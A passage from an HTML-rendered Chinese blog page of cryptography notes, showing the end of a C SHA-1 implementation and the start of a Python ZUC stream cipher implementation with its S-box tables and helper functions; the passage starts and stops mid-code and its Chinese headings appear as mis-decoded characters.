class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">20</span>; t &lt;= <span class="hljs-number">39</span>; t++)<br>        &#123;<br>            uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Parity(B, C, D) + E + W[t] + K[<span class="hljs-number">1</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">40</span>; t &lt;= <span class="hljs-number">59</span>; t++)<br>        &#123;<br>            uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Maj(B, C, D) + E + W[t] + K[<span class="hljs-number">2</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br>        <span class="hljs-keyword">for</span> (t = <span class="hljs-number">60</span>; t &lt;= <span class="hljs-number">79</span>; t++)<br>        &#123;<br>            uint32_t temp = MoveLeft(A, <span class="hljs-number">5</span>) + Parity(B, C, D) + E + W[t] + K[<span class="hljs-number">3</span>];<br>            E = D;<br>            D = C;<br>            C = MoveLeft(B, <span class="hljs-number">30</span>);<br>            B = A;<br>            A = temp;<br>        &#125;<br> <br>        /*  e. Let H0 = H0 + A, H1 = H1 + B, H2 = H2 + C, H3 = H3 + D, H4 = H4 + E. */<br>        H0 = H0 + A;<br>        H1 = H1 + B;<br>        H2 = H2 + C;<br>        H3 = H3 + D;<br>        H4 = H4 + E;<br>    &#125;<br> <br>    // step <span class="hljs-number">5</span>: è¾“å‡ºABCD<br>    uint32_t* pOut = (uint8_t*)out;<br>    pOut[<span class="hljs-number">0</span>] = __bswap_32(H0);<br>    pOut[<span class="hljs-number">1</span>] = __bswap_32(H1);<br>    pOut[<span class="hljs-number">2</span>] = __bswap_32(H2);<br>    pOut[<span class="hljs-number">3</span>] = __bswap_32(H3);<br>    pOut[<span class="hljs-number">4</span>] = __bswap_32(H4);<br>    free(X);<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br> <br><span class="hljs-built_in">int</span> main()<br>&#123;<br>    unsigned char digest[<span class="hljs-number">20</span>] = &#123; <span class="hljs-number">0</span> &#125;;<br> <br>    sha1(digest, <span class="hljs-string">&quot;Hello World!&quot;</span>, strlen(<span class="hljs-string">&quot;Hello World!&quot;</span>));<br> <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="ç¥–å†²ä¹‹ï¼ˆZUC"><a href="#ç¥–å†²ä¹‹ï¼ˆZUC" class="headerlink" title="ç¥–å†²ä¹‹ï¼ˆZUC)"></a>ç¥–å†²ä¹‹ï¼ˆZUC)</h1><p>åºåˆ—å¯†ç ï¼Œå‚è€ƒåŠ è§£å¯†è„šæœ¬ï¼Œéœ€è¦å·²çŸ¥keyå’Œiv</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> ceil<br> <br>S0 = [<br>    <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x09</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xCB</span>,<br>    <span class="hljs-number">0x7B</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0x90</span>,<br>    <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0xE4</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xDD</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x48</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0xAC</span>,<br>    <span class="hljs-number">0xCD</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x38</span>,<br>    <span class="hljs-number">0x76</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x21</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x55</span>, <span class="hljs-number">0x9B</span>,<br>    <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x5A</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x1C</span>,<br>    <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0x01</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0xAD</span>,<br>    <span class="hljs-number">0x3B</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0xEB</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xDE</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x87</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0x3A</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0xC8</span>,<br>    <span class="hljs-number">0xB1</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x28</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0x89</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x56</span>,<br>    <span class="hljs-number">0x07</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0xFE</span>,<br>    <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0x88</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0xF2</span>, <span class="hljs-number">0xE1</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0xE9</span>, <span class="hljs-number">0x5D</span>,<br>    <span class="hljs-number">0xD0</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0x64</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x42</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0x23</span>,<br>    <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x44</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0xF1</span>,<br>    <span class="hljs-number">0xF6</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0x0F</span>,<br>    <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x77</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xA9</span>, <span class="hljs-number">0x65</span>,<br>    <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xEE</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x34</span>, <span class="hljs-number">0x60</span><br>]<br> <br>S1 = [<br>    <span class="hljs-number">0x55</span>, <span class="hljs-number">0xC2</span>, <span class="hljs-number">0x63</span>, <span class="hljs-number">0x71</span>, <span class="hljs-number">0x3B</span>, <span class="hljs-number">0xC8</span>, <span class="hljs-number">0x47</span>, <span class="hljs-number">0x86</span>, <span class="hljs-number">0x9F</span>, <span class="hljs-number">0x3C</span>, <span class="hljs-number">0xDA</span>, <span class="hljs-number">0x5B</span>, <span class="hljs-number">0x29</span>, <span class="hljs-number">0xAA</span>, <span class="hljs-number">0xFD</span>, <span class="hljs-number">0x77</span>,<br>    <span class="hljs-number">0x8C</span>, <span class="hljs-number">0xC5</span>, <span class="hljs-number">0x94</span>, <span class="hljs-number">0x0C</span>, <span class="hljs-number">0xA6</span>, <span class="hljs-number">0x1A</span>, <span class="hljs-number">0x13</span>, <span class="hljs-number">0x00</span>, <span class="hljs-number">0xE3</span>, <span class="hljs-number">0xA8</span>, <span class="hljs-number">0x16</span>, <span class="hljs-number">0x72</span>, <span class="hljs-number">0x40</span>, <span class="hljs-number">0xF9</span>, <span class="hljs-number">0xF8</span>, <span class="hljs-number">0x42</span>,<br>    <span class="hljs-number">0x44</span>, <span class="hljs-number">0x26</span>, <span class="hljs-number">0x68</span>, <span class="hljs-number">0x96</span>, <span class="hljs-number">0x81</span>, <span class="hljs-number">0xD9</span>, <span class="hljs-number">0x45</span>, <span class="hljs-number">0x3E</span>, <span class="hljs-number">0x10</span>, <span class="hljs-number">0x76</span>, <span class="hljs-number">0xC6</span>, <span class="hljs-number">0xA7</span>, <span class="hljs-number">0x8B</span>, <span class="hljs-number">0x39</span>, <span class="hljs-number">0x43</span>, <span class="hljs-number">0xE1</span>,<br>    <span class="hljs-number">0x3A</span>, <span class="hljs-number">0xB5</span>, <span class="hljs-number">0x56</span>, <span class="hljs-number">0x2A</span>, <span class="hljs-number">0xC0</span>, <span class="hljs-number">0x6D</span>, <span class="hljs-number">0xB3</span>, <span class="hljs-number">0x05</span>, <span class="hljs-number">0x22</span>, <span class="hljs-number">0x66</span>, <span class="hljs-number">0xBF</span>, <span class="hljs-number">0xDC</span>, <span class="hljs-number">0x0B</span>, <span class="hljs-number">0xFA</span>, <span class="hljs-number">0x62</span>, <span class="hljs-number">0x48</span>,<br>    <span class="hljs-number">0xDD</span>, <span class="hljs-number">0x20</span>, <span class="hljs-number">0x11</span>, <span class="hljs-number">0x06</span>, <span class="hljs-number">0x36</span>, <span class="hljs-number">0xC9</span>, <span class="hljs-number">0xC1</span>, <span class="hljs-number">0xCF</span>, <span class="hljs-number">0xF6</span>, <span class="hljs-number">0x27</span>, <span class="hljs-number">0x52</span>, <span class="hljs-number">0xBB</span>, <span class="hljs-number">0x69</span>, <span class="hljs-number">0xF5</span>, <span class="hljs-number">0xD4</span>, <span class="hljs-number">0x87</span>,<br>    <span class="hljs-number">0x7F</span>, <span class="hljs-number">0x84</span>, <span class="hljs-number">0x4C</span>, <span class="hljs-number">0xD2</span>, <span class="hljs-number">0x9C</span>, <span class="hljs-number">0x57</span>, <span class="hljs-number">0xA4</span>, <span class="hljs-number">0xBC</span>, <span class="hljs-number">0x4F</span>, <span class="hljs-number">0x9A</span>, <span class="hljs-number">0xDF</span>, <span class="hljs-number">0xFE</span>, <span class="hljs-number">0xD6</span>, <span class="hljs-number">0x8D</span>, <span class="hljs-number">0x7A</span>, <span class="hljs-number">0xEB</span>,<br>    <span class="hljs-number">0x2B</span>, <span class="hljs-number">0x53</span>, <span class="hljs-number">0xD8</span>, <span class="hljs-number">0x5C</span>, <span class="hljs-number">0xA1</span>, <span class="hljs-number">0x14</span>, <span class="hljs-number">0x17</span>, <span class="hljs-number">0xFB</span>, <span class="hljs-number">0x23</span>, <span class="hljs-number">0xD5</span>, <span class="hljs-number">0x7D</span>, <span class="hljs-number">0x30</span>, <span class="hljs-number">0x67</span>, <span class="hljs-number">0x73</span>, <span class="hljs-number">0x08</span>, <span class="hljs-number">0x09</span>,<br>    <span class="hljs-number">0xEE</span>, <span class="hljs-number">0xB7</span>, <span class="hljs-number">0x70</span>, <span class="hljs-number">0x3F</span>, <span class="hljs-number">0x61</span>, <span class="hljs-number">0xB2</span>, <span class="hljs-number">0x19</span>, <span class="hljs-number">0x8E</span>, <span class="hljs-number">0x4E</span>, <span class="hljs-number">0xE5</span>, <span class="hljs-number">0x4B</span>, <span class="hljs-number">0x93</span>, <span class="hljs-number">0x8F</span>, <span class="hljs-number">0x5D</span>, <span class="hljs-number">0xDB</span>, <span class="hljs-number">0xA9</span>,<br>    <span class="hljs-number">0xAD</span>, <span class="hljs-number">0xF1</span>, <span class="hljs-number">0xAE</span>, <span class="hljs-number">0x2E</span>, <span class="hljs-number">0xCB</span>, <span class="hljs-number">0x0D</span>, <span class="hljs-number">0xFC</span>, <span class="hljs-number">0xF4</span>, <span class="hljs-number">0x2D</span>, <span class="hljs-number">0x46</span>, <span class="hljs-number">0x6E</span>, <span class="hljs-number">0x1D</span>, <span class="hljs-number">0x97</span>, <span class="hljs-number">0xE8</span>, <span class="hljs-number">0xD1</span>, <span class="hljs-number">0xE9</span>,<br>    <span class="hljs-number">0x4D</span>, <span class="hljs-number">0x37</span>, <span class="hljs-number">0xA5</span>, <span class="hljs-number">0x75</span>, <span class="hljs-number">0x5E</span>, <span class="hljs-number">0x83</span>, <span class="hljs-number">0x9E</span>, <span class="hljs-number">0xAB</span>, <span class="hljs-number">0x82</span>, <span class="hljs-number">0x9D</span>, <span class="hljs-number">0xB9</span>, <span class="hljs-number">0x1C</span>, <span class="hljs-number">0xE0</span>, <span class="hljs-number">0xCD</span>, <span class="hljs-number">0x49</span>, <span class="hljs-number">0x89</span>,<br>    <span class="hljs-number">0x01</span>, <span class="hljs-number">0xB6</span>, <span class="hljs-number">0xBD</span>, <span class="hljs-number">0x58</span>, <span class="hljs-number">0x24</span>, <span class="hljs-number">0xA2</span>, <span class="hljs-number">0x5F</span>, <span class="hljs-number">0x38</span>, <span class="hljs-number">0x78</span>, <span class="hljs-number">0x99</span>, <span class="hljs-number">0x15</span>, <span class="hljs-number">0x90</span>, <span class="hljs-number">0x50</span>, <span class="hljs-number">0xB8</span>, <span class="hljs-number">0x95</span>, <span class="hljs-number">0xE4</span>,<br>    <span class="hljs-number">0xD0</span>, <span class="hljs-number">0x91</span>, <span class="hljs-number">0xC7</span>, <span class="hljs-number">0xCE</span>, <span class="hljs-number">0xED</span>, <span class="hljs-number">0x0F</span>, <span class="hljs-number">0xB4</span>, <span class="hljs-number">0x6F</span>, <span class="hljs-number">0xA0</span>, <span class="hljs-number">0xCC</span>, <span class="hljs-number">0xF0</span>, <span class="hljs-number">0x02</span>, <span class="hljs-number">0x4A</span>, <span class="hljs-number">0x79</span>, <span class="hljs-number">0xC3</span>, <span class="hljs-number">0xDE</span>,<br>    <span class="hljs-number">0xA3</span>, <span class="hljs-number">0xEF</span>, <span class="hljs-number">0xEA</span>, <span class="hljs-number">0x51</span>, <span class="hljs-number">0xE6</span>, <span class="hljs-number">0x6B</span>, <span class="hljs-number">0x18</span>, <span class="hljs-number">0xEC</span>, <span class="hljs-number">0x1B</span>, <span class="hljs-number">0x2C</span>, <span class="hljs-number">0x80</span>, <span class="hljs-number">0xF7</span>, <span class="hljs-number">0x74</span>, <span class="hljs-number">0xE7</span>, <span class="hljs-number">0xFF</span>, <span class="hljs-number">0x21</span>,<br>    <span class="hljs-number">0x5A</span>, <span class="hljs-number">0x6A</span>, <span class="hljs-number">0x54</span>, <span class="hljs-number">0x1E</span>, <span class="hljs-number">0x41</span>, <span class="hljs-number">0x31</span>, <span class="hljs-number">0x92</span>, <span class="hljs-number">0x35</span>, <span class="hljs-number">0xC4</span>, <span class="hljs-number">0x33</span>, <span class="hljs-number">0x07</span>, <span class="hljs-number">0x0A</span>, <span class="hljs-number">0xBA</span>, <span class="hljs-number">0x7E</span>, <span class="hljs-number">0x0E</span>, <span class="hljs-number">0x34</span>,<br>    <span class="hljs-number">0x88</span>, <span class="hljs-number">0xB1</span>, <span class="hljs-number">0x98</span>, <span class="hljs-number">0x7C</span>, <span class="hljs-number">0xF3</span>, <span class="hljs-number">0x3D</span>, <span class="hljs-number">0x60</span>, <span class="hljs-number">0x6C</span>, <span class="hljs-number">0x7B</span>, <span class="hljs-number">0xCA</span>, <span class="hljs-number">0xD3</span>, <span class="hljs-number">0x1F</span>, <span class="hljs-number">0x32</span>, <span class="hljs-number">0x65</span>, <span class="hljs-number">0x04</span>, <span class="hljs-number">0x28</span>,<br>    <span class="hljs-number">0x64</span>, <span class="hljs-number">0xBE</span>, <span class="hljs-number">0x85</span>, <span class="hljs-number">0x9B</span>, <span class="hljs-number">0x2F</span>, <span class="hljs-number">0x59</span>, <span class="hljs-number">0x8A</span>, <span class="hljs-number">0xD7</span>, <span class="hljs-number">0xB0</span>, <span class="hljs-number">0x25</span>, <span class="hljs-number">0xAC</span>, <span class="hljs-number">0xAF</span>, <span class="hljs-number">0x12</span>, <span class="hljs-number">0x03</span>, <span class="hljs-number">0xE2</span>, <span class="hljs-number">0xF2</span><br>]<br> <br>D = [<br>    <span class="hljs-number">0x44D7</span>, <span class="hljs-number">0x26BC</span>, <span class="hljs-number">0x626B</span>, <span class="hljs-number">0x135E</span>, <span class="hljs-number">0x5789</span>, <span class="hljs-number">0x35E2</span>, <span class="hljs-number">0x7135</span>, <span class="hljs-number">0x09AF</span>,<br>    <span class="hljs-number">0x4D78</span>, <span class="hljs-number">0x2F13</span>, <span class="hljs-number">0x6BC4</span>, <span class="hljs-number">0x1AF1</span>, <span class="hljs-number">0x5E26</span>, <span class="hljs-number">0x3C4D</span>, <span class="hljs-number">0x789A</span>, <span class="hljs-number">0x47AC</span><br>]<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">addition_uint31</span>(<span class="hljs-params">a, b</span>):<br>    c = a + b<br>    <span class="hljs-keyword">return</span> (c &amp; <span class="hljs-number">0x7FFFFFFF</span>) + (c &gt;&gt; <span class="hljs-number">31</span>)<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotl_uint31</span>(<span class="hljs-params">a, shift</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; shift) | (a &gt;&gt; (<span class="hljs-number">31</span> - shift))) &amp; <span class="hljs-number">0x7FFFFFFF</span><br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rotl_uint32</span>(<span class="hljs-params">a, shift</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; shift) | (a &gt;&gt; (<span class="hljs-number">32</span> - shift))) &amp; <span class="hljs-number">0xFFFFFFFF</span><br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">l1</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> (x ^ rotl_uint32(x, <span class="hljs-number">2</span>) ^ rotl_uint32(x, <span class="hljs-number">10</span>) ^ rotl_uint32(x, <span class="hljs-number">18</span>) ^ rotl_uint32(x, <span class="hljs-number">24</span>))<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">l2</span>(<span class="hljs-params">x</span>):<br>    <span class="hljs-keyword">return</span> (x ^ rotl_uint32(x, <span class="hljs-number">8</span>) ^ rotl_uint32(x, <span class="hljs-number">14</span>) ^ rotl_uint32(x, <span class="hljs-number">22</span>) ^ rotl_uint32(x, <span class="hljs-number">30</span>))<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_uint32</span>(<span class="hljs-params">a, b, c, d</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; <span class="hljs-number">24</span>) &amp; <span class="hljs-number">0xffffffff</span>) | ((b &lt;&lt; <span class="hljs-number">16</span>) &amp; <span class="hljs-number">0xffffffff</span>) | ((c &lt;&lt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0xffffffff</span>) | d<br> <br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">make_uint31</span>(<span class="hljs-params">a, b, c</span>):<br>    <span class="hljs-keyword">return</span> ((a &lt;&lt; <span class="hljs-number">23</span>) &amp; <span class="hljs-number">0x7fffffff</span>) | ((b &lt;&lt; <span class="hljs-number">8</span>) &amp; <span class="hljs-number">0x7fffffff</span>) | c<br> <br> <br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ZUC</span>(<span class="hljs-title class_ inherited__">object</span>):<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, key, iv</span>):<br>        self.r = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        self.lfsr = [<span class="hljs-number">0</span> <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]<br>        self.x = [<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>]<br>        self.zuc_init(key, iv)<br> <br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">bit_reorganization</span>(<span class="hljs-params">self</span>):<br>        self.x[<span class="hljs-number">0</span>] = ((self.lfsr[<span class="hljs-number">15</span>] &amp; <span class="hljs-number">0x7FFF8000</span>) &lt;&lt; <span class="hljs-number">1</span>) | (self.lfsr[<span class="hljs-number">14</span>] &amp; <span class="hljs-number">0xFFFF</span>)<br>        self.x[<span class="hljs-number">1</span>] = ((self.lfsr[<span class="hljs-number">11</span>] &amp; <span class="hljs-number">0xFFFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | (self.lfsr[<span class="hljs-number">9</span>] &gt;&gt; <span class="hljs-number">15</span>)<br>        self.x[<span class="hljs-number">2</span>] = ((self.lfsr[<span class="hljs-number">7</span>] &amp; <span class="hljs-number">0xFFFF</span>) &lt;&lt; <span class="hljs-number">16</span>) | (self.lfsr[<span 